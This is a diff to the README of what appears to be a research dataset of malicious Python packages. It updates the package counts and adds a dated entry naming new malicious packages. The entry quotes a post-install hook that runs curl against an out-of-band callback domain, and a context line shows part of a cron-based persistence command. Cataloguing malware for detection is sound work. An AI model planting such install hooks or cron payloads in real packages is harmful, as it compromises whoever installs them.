@@ -1,6 +1,6 @@
 ## Dataset Size
 
-This data set includes about 5,896 versions of the source code of 5,174 malicious packages.
+This data set includes about 5,902 versions of the source code of 5,176 malicious packages.
 
 ## Dataset Format
 
@@ -306,6 +306,16 @@ __import__("os").system("(crontab -l > .tab ; echo "*/5 * * * * /bin/bash -c '/b
 
 ### 20 May. 2024 
 python-consul2-hh [999.9.9]
+
+### 21 May. 2024 
+jupyter_calendar_extension [0.1]
+
+blypack [0.1, 0.2, 0.3, 0.4, 0.5]
+
+```python
+def post_install():
+    os.system('curl https://kymslgsrz9xelqdvm7uxogrrnit9ha5z.oastify.com/test')
+```
 
 ## About the malicious packages detection
 
